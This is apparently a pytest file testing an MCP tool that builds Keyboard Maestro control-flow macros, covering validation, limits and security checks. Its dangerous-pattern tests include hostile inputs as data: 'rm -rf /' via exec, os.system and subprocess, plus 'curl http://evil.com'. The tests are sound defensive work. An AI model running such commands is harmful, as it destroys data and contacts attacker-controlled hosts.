"""Unit tests for control flow tools.

import logging

logging.basicConfig(level=logging.DEBUG)
Tests the MCP tool interface for control flow functionality including parameter
validation, security checks, and Keyboard Maestro integration.
"""

from __future__ import annotations

from typing import Any
from unittest.mock import AsyncMock, Mock, patch

import pytest
from src.core.control_flow import (
    ComparisonOperator,
    ControlFlowValidator,
    ForLoopNode,
    IfThenElseNode,
    SwitchCaseNode,
    WhileLoopNode,
)
from src.core.errors import SecurityError, ValidationError
from src.server.tools.control_flow_tools import (
    _build_control_flow_structure,
    _get_structure_info,
    _validate_control_flow_inputs,
    km_control_flow,
)


async def _run_with_mocked_append(coro: Any) -> dict[str, Any]:
    """Run a km_control_flow call with append_macro_action_async stubbed to success.

    The new emitter modes (if/for/while/until/try) all reach KM via
    ``KMClient.append_macro_action_async``. Patching it returns a right-Either
    so tests cover the dispatcher + emitter without a live KM Engine.
    """
    from src.core.either import Either

    fake_append = AsyncMock(return_value=Either.right(True))
    with patch(
        "src.server.tools.control_flow_tools.get_km_client",
    ) as get_client:
        get_client.return_value.append_macro_action_async = fake_append
        return await coro


class TestKMControlFlowTool:
    """Test the main km_control_flow MCP tool."""

    @pytest.fixture
    def mock_context(self) -> Mock:
        """Create mock MCP context."""
        context = Mock()
        context.info = AsyncMock()
        context.error = AsyncMock()
        return context

    @pytest.mark.asyncio
    async def test_if_then_else_success(self, mock_context: Any) -> None:
        """if_then_else dispatches to the emitter and appends one action."""
        result = await _run_with_mocked_append(
            km_control_flow(
                macro_identifier="test_macro",
                control_type="if_then_else",
                condition="MyVar",
                operator="contains",
                operand="password",
                actions_true=[{"type": "pause", "seconds": 0.1}],
                actions_false=[{"type": "pause", "seconds": 0.2}],
                ctx=mock_context,
            ),
        )
        assert result["success"] is True
        assert result["data"]["control_type"] == "if_then_else"
        assert result["data"]["macro_action_type"] == "IfThenElse"
        mock_context.info.assert_called()

    @pytest.mark.asyncio
    async def test_for_loop_success(self, mock_context: Any) -> None:
        """for_loop builds a For action with a CollectionList entry."""
        result = await _run_with_mocked_append(
            km_control_flow(
                macro_identifier="test_macro",
                control_type="for_loop",
                iterator="i",
                collection_dict={"type": "Range", "start": "1", "end": "5"},
                loop_actions=[{"type": "pause", "seconds": 0.1}],
                ctx=mock_context,
            ),
        )
        assert result["success"] is True
        assert result["data"]["control_type"] == "for_loop"
        assert result["data"]["macro_action_type"] == "For"
        assert result["data"]["collection_type"] == "Range"
        assert result["data"]["loop_action_count"] == 1

    @pytest.mark.asyncio
    async def test_while_loop_success(self, mock_context: Any) -> None:
        """while_loop emits a While action with a Conditions block."""
        result = await _run_with_mocked_append(
            km_control_flow(
                macro_identifier="test_macro",
                control_type="while_loop",
                condition="counter",
                operator="less_than",
                operand="10",
                loop_actions=[{"type": "pause", "seconds": 0.1}],
                ctx=mock_context,
            ),
        )
        assert result["success"] is True
        assert result["data"]["control_type"] == "while_loop"
        assert result["data"]["macro_action_type"] == "While"

    @pytest.mark.asyncio
    async def test_until_loop_success(self, mock_context: Any) -> None:
        """until_loop emits an Until action — same shape as while, different MacroActionType."""
        result = await _run_with_mocked_append(
            km_control_flow(
                macro_identifier="test_macro",
                control_type="until_loop",
                condition="counter",
                operator="equals",
                operand="done",
                loop_actions=[{"type": "pause", "seconds": 0.1}],
                ctx=mock_context,
            ),
        )
        assert result["success"] is True
        assert result["data"]["macro_action_type"] == "Until"

    @pytest.mark.asyncio
    async def test_try_catch_success(self, mock_context: Any) -> None:
        """try_catch wraps try and catch action lists into a TryCatch plist."""
        result = await _run_with_mocked_append(
            km_control_flow(
                macro_identifier="test_macro",
                control_type="try_catch",
                try_actions=[{"type": "pause", "seconds": 0.1}],
                catch_actions=[{"type": "set_variable", "variable": "Caught", "text": "yes"}],
                ctx=mock_context,
            ),
        )
        assert result["success"] is True
        assert result["data"]["macro_action_type"] == "TryCatch"
        assert result["data"]["try_action_count"] == 1
        assert result["data"]["catch_action_count"] == 1

    @pytest.mark.asyncio
    async def test_switch_case_success(self, mock_context: Any) -> None:
        """switch_case emits a Switch action with cases + Otherwise sentinel."""
        result = await _run_with_mocked_append(
            km_control_flow(
                macro_identifier="test_macro",
                control_type="switch_case",
                source="Variable",
                condition="MyVar",
                cases=[
                    {"condition_type": "Is", "test_value": "v1",
                     "actions": [{"type": "pause", "seconds": 0.1}]},
                    {"condition_type": "Contains", "test_value": "v2",
                     "actions": [{"type": "pause", "seconds": 0.1}]},
                ],
                default_actions=[{"type": "set_variable", "variable": "FellThrough", "text": "yes"}],
                ctx=mock_context,
            ),
        )
        assert result["success"] is True
        assert result["data"]["control_type"] == "switch_case"
        assert result["data"]["macro_action_type"] == "Switch"
        assert result["data"]["source"] == "Variable"
        assert result["data"]["case_count"] == 3  # 2 explicit + 1 Otherwise
        assert result["data"]["has_otherwise"] is True

    @pytest.mark.asyncio
    async def test_validation_error(self, mock_context: Any) -> None:
        """Test validation error handling."""
        result = await km_control_flow(
            macro_identifier="",  # Invalid empty identifier
            control_type="if_then_else",
            condition="test",
            ctx=mock_context,
        )

        assert result["success"] is False
        assert result["error"]["code"] == "VALIDATION_ERROR"
        assert (
            "macro_identifier" in result["error"]["message"]
            and "cannot be empty" in result["error"]["message"]
        )
        mock_context.error.assert_called()

    @pytest.mark.asyncio
    async def test_security_error(self, mock_context: Any) -> None:
        """Test security error handling."""
        result = await km_control_flow(
            macro_identifier="test_macro",
            control_type="if_then_else",
            condition="exec('rm -rf /')",  # Dangerous condition
            operator="equals",
            operand="test",
            actions_true=[{"type": "test"}],
            ctx=mock_context,
        )

        assert result["success"] is False
        assert result["error"]["code"] == "SECURITY_ERROR"
        assert "dangerous pattern" in result["error"]["message"].lower()
        mock_context.error.assert_called()

    @pytest.mark.asyncio
    async def test_missing_required_parameters(self, mock_context: Any) -> None:
        """Test missing required parameters."""
        # If/then/else without condition
        result1 = await km_control_flow(
            macro_identifier="test_macro",
            control_type="if_then_else",
            # Missing condition
            ctx=mock_context,
        )

        assert result1["success"] is False
        assert result1["error"]["code"] == "VALIDATION_ERROR"

        # For loop without iterator
        result2 = await km_control_flow(
            macro_identifier="test_macro",
            control_type="for_loop",
            # Missing iterator and collection
            ctx=mock_context,
        )

        assert result2["success"] is False
        assert result2["error"]["code"] == "VALIDATION_ERROR"

    @pytest.mark.asyncio
    async def test_security_bounds_validation(self, mock_context: Any) -> None:
        """Test security bounds validation."""
        # Test max iterations limit
        result = await km_control_flow(
            macro_identifier="test_macro",
            control_type="for_loop",
            iterator="i",
            collection="items",
            loop_actions=[{"type": "test"}],
            max_iterations=15000,  # Over limit
            ctx=mock_context,
        )

        assert result["success"] is False
        assert result["error"]["code"] == "VALIDATION_ERROR"
        assert "must be between 1 and 10000" in result["error"]["message"]

    @pytest.mark.asyncio
    async def test_timeout_validation(self, mock_context: Any) -> None:
        """Test timeout validation."""
        result = await km_control_flow(
            macro_identifier="test_macro",
            control_type="if_then_else",
            condition="test",
            operator="equals",
            operand="value",
            actions_true=[{"type": "test"}],
            timeout_seconds=500,  # Over limit
            ctx=mock_context,
        )

        assert result["success"] is False
        assert result["error"]["code"] == "VALIDATION_ERROR"
        assert "must be between 1 and 300" in result["error"]["message"]


class TestInputValidation:
    """Test input validation functions."""

    @pytest.mark.asyncio
    async def test_valid_inputs(self) -> None:
        """Test validation with valid inputs."""
        await _validate_control_flow_inputs(
            macro_identifier="test_macro",
            control_type="if_then_else",
            condition="test_condition",
            operator="equals",
            operand="test_value",
            iterator=None,
            collection=None,
            max_iterations=1000,
            timeout_seconds=30,
            ctx=None,
        )
        # Should not raise any exception

    @pytest.mark.asyncio
    async def test_invalid_macro_identifier(self) -> None:
        """Test invalid macro identifier validation."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            await _validate_control_flow_inputs(
                macro_identifier="",
                control_type="if_then_else",
                condition="test",
                operator="equals",
                operand="value",
                iterator=None,
                collection=None,
                max_iterations=1000,
                timeout_seconds=30,
                ctx=None,
            )

        with pytest.raises(ValidationError, match="must be 255 characters or less"):
            await _validate_control_flow_inputs(
                macro_identifier="x" * 300,  # Too long
                control_type="if_then_else",
                condition="test",
                operator="equals",
                operand="value",
                iterator=None,
                collection=None,
                max_iterations=1000,
                timeout_seconds=30,
                ctx=None,
            )

    @pytest.mark.asyncio
    async def test_invalid_control_type(self) -> None:
        """Test invalid control type validation."""
        with pytest.raises(ValidationError, match="must be one of"):
            await _validate_control_flow_inputs(
                macro_identifier="test_macro",
                control_type="invalid_type",
                condition="test",
                operator="equals",
                operand="value",
                iterator=None,
                collection=None,
                max_iterations=1000,
                timeout_seconds=30,
                ctx=None,
            )

    @pytest.mark.asyncio
    async def test_invalid_operator(self) -> None:
        """Test invalid operator validation."""
        with pytest.raises(ValidationError, match="must be one of"):
            await _validate_control_flow_inputs(
                macro_identifier="test_macro",
                control_type="if_then_else",
                condition="test",
                operator="invalid_operator",
                operand="value",
                iterator=None,
                collection=None,
                max_iterations=1000,
                timeout_seconds=30,
                ctx=None,
            )

    @pytest.mark.asyncio
    async def test_dangerous_condition_patterns(self) -> None:
        """Test dangerous pattern detection in conditions."""
        dangerous_conditions = [
            "exec('malicious code')",
            "import os; os.system('rm -rf /')",
            "subprocess.call(['rm', '-rf', '/'])",
            "eval('dangerous')",
            "format(malicious)",
            "curl http://evil.com",
        ]

        for dangerous in dangerous_conditions:
            with pytest.raises(SecurityError, match="Dangerous pattern detected"):
                await _validate_control_flow_inputs(
                    macro_identifier="test_macro",
                    control_type="if_then_else",
                    condition=dangerous,
                    operator="equals",
                    operand="value",
                    iterator=None,
                    collection=None,
                    max_iterations=1000,
                    timeout_seconds=30,
                    ctx=None,
                )

    @pytest.mark.asyncio
    async def test_for_loop_validation(self) -> None:
        """Test for loop specific validation."""
        with pytest.raises(ValidationError, match="For loop requires an iterator"):
            await _validate_control_flow_inputs(
                macro_identifier="test_macro",
                control_type="for_loop",
                condition=None,
                operator="equals",
                operand=None,
                iterator=None,  # Missing iterator
                collection="items",
                max_iterations=1000,
                timeout_seconds=30,
                ctx=None,
            )

        with pytest.raises(ValidationError, match="For loop requires collection_dict"):
            await _validate_control_flow_inputs(
                macro_identifier="test_macro",
                control_type="for_loop",
                condition=None,
                operator="equals",
                operand=None,
                iterator="item",
                collection=None,  # Missing collection
                max_iterations=1000,
                timeout_seconds=30,
                ctx=None,
            )


class TestStructureBuilding:
    """Test control flow structure building."""

    @pytest.mark.asyncio
    async def test_build_if_then_else(self) -> None:
        """Test if/then/else structure building."""
        validator = ControlFlowValidator()

        node = await _build_control_flow_structure(
            control_type="if_then_else",
            condition="clipboard_content",
            operator="contains",
            operand="password",
            iterator=None,
            collection=None,
            cases=None,
            actions_true=[{"type": "alert", "message": "Security alert"}],
            actions_false=[{"type": "continue"}],
            loop_actions=None,
            default_actions=None,
            max_iterations=1000,
            case_sensitive=True,
            negate=False,
            validator=validator,
            ctx=None,
        )

        assert isinstance(node, IfThenElseNode)
        assert node.condition.expression == "clipboard_content"
        assert node.condition.operator == ComparisonOperator.CONTAINS
        assert node.condition.operand == "password"
        assert len(node.then_actions.actions) == 1
        assert len(node.else_actions.actions) == 1

    @pytest.mark.asyncio
    async def test_build_for_loop(self) -> None:
        """Test for loop structure building."""
        validator = ControlFlowValidator()

        node = await _build_control_flow_structure(
            control_type="for_loop",
            condition=None,
            operator="equals",
            operand=None,
            iterator="file",
            collection="selected_files",
            cases=None,
            actions_true=None,
            actions_false=None,
            loop_actions=[{"type": "process_file", "file": "%Variable%file%"}],
            default_actions=None,
            max_iterations=100,
            case_sensitive=True,
            negate=False,
            validator=validator,
            ctx=None,
        )

        assert isinstance(node, ForLoopNode)
        assert node.loop_config.iterator_variable == "file"
        assert node.loop_config.collection_expression == "selected_files"
        assert node.loop_config.max_iterations == 100
        assert len(node.loop_actions.actions) == 1

    @pytest.mark.asyncio
    async def test_build_while_loop(self) -> None:
        """Test while loop structure building."""
        validator = ControlFlowValidator()

        node = await _build_control_flow_structure(
            control_type="while_loop",
            condition="counter",
            operator="less_than",
            operand="10",
            iterator=None,
            collection=None,
            cases=None,
            actions_true=None,
            actions_false=None,
            loop_actions=[{"type": "increment", "variable": "counter"}],
            default_actions=None,
            max_iterations=50,
            case_sensitive=True,
            negate=False,
            validator=validator,
            ctx=None,
        )

        assert isinstance(node, WhileLoopNode)
        assert node.condition.expression == "counter"
        assert node.condition.operator == ComparisonOperator.LESS_THAN
        assert node.condition.operand == "10"
        assert node.max_iterations == 50
        assert len(node.loop_actions.actions) == 1

    @pytest.mark.asyncio
    async def test_build_switch_case(self) -> None:
        """Test switch/case structure building."""
        validator = ControlFlowValidator()

        cases = [
            {"value": "Safari", "actions": [{"type": "screenshot"}]},
            {"value": "Chrome", "actions": [{"type": "export_bookmarks"}]},
            {"value": "Firefox", "actions": [{"type": "clear_cache"}]},
        ]

        node = await _build_control_flow_structure(
            control_type="switch_case",
            condition="frontmost_application",
            operator="equals",
            operand=None,
            iterator=None,
            collection=None,
            cases=cases,
            actions_true=None,
            actions_false=None,
            loop_actions=None,
            default_actions=[{"type": "show_notification", "text": "Unsupported"}],
            max_iterations=1000,
            case_sensitive=True,
            negate=False,
            validator=validator,
            ctx=None,
        )

        assert isinstance(node, SwitchCaseNode)
        assert node.switch_variable == "frontmost_application"
        assert len(node.cases) == 3
        assert node.has_default_case() is True
        assert node.cases[0].case_value == "Safari"
        assert node.cases[1].case_value == "Chrome"
        assert node.cases[2].case_value == "Firefox"

    @pytest.mark.asyncio
    async def test_missing_required_data(self) -> None:
        """Test building with missing required data."""
        validator = ControlFlowValidator()

        with pytest.raises(
            ValidationError,
            match="requires condition and true actions",
        ):
            await _build_control_flow_structure(
                control_type="if_then_else",
                condition=None,  # Missing condition
                operator="equals",
                operand="value",
                iterator=None,
                collection=None,
                cases=None,
                actions_true=None,  # Missing actions
                actions_false=None,
                loop_actions=None,
                default_actions=None,
                max_iterations=1000,
                case_sensitive=True,
                negate=False,
                validator=validator,
                ctx=None,
            )


class TestStructureInfo:
    """Test structure information extraction."""

    def test_if_then_else_info(self) -> None:
        """Test if/then/else structure info."""
        from src.core.control_flow import ComparisonOperator, create_simple_if

        node = create_simple_if(
            "test_condition",
            ComparisonOperator.EQUALS,
            "test_value",
            [{"type": "action1"}, {"type": "action2"}],
            [{"type": "action3"}],
        )

        info = _get_structure_info(node)

        assert info["node_type"] == "IfThenElseNode"
        assert info["has_else_branch"] is True
        assert info["condition_operator"] == "equals"
        assert info["then_action_count"] == 2
        assert info["else_action_count"] == 1

    def test_for_loop_info(self) -> None:
        """Test for loop structure info."""
        from src.core.control_flow import create_for_loop

        node = create_for_loop(
            "item",
            "collection",
            [{"type": "action1"}, {"type": "action2"}, {"type": "action3"}],
            max_iterations=100,
        )

        info = _get_structure_info(node)

        assert info["node_type"] == "ForLoopNode"
        assert info["iterator_variable"] == "item"
        assert info["collection_expression"] == "collection"
        assert info["max_iterations"] == 100
        assert info["action_count"] == 3

    def test_while_loop_info(self) -> None:
        """Test while loop structure info."""
        from src.core.control_flow import ComparisonOperator, create_while_loop

        node = create_while_loop(
            "counter",
            ComparisonOperator.LESS_THAN,
            "10",
            [{"type": "increment"}],
            max_iterations=50,
        )

        info = _get_structure_info(node)

        assert info["node_type"] == "WhileLoopNode"
        assert info["condition_operator"] == "less_than"
        assert info["max_iterations"] == 50
        assert info["action_count"] == 1
